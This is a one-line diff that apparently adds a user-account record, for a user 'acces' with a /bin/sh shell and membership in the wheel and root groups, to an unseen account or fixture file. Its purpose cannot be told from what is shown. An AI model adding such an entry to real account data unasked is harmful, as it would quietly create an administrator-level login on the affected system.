@@ -1,0 +1,2 @@
+acces -1 acces -1 =acces /home/acces /bin/sh wheel,root
+
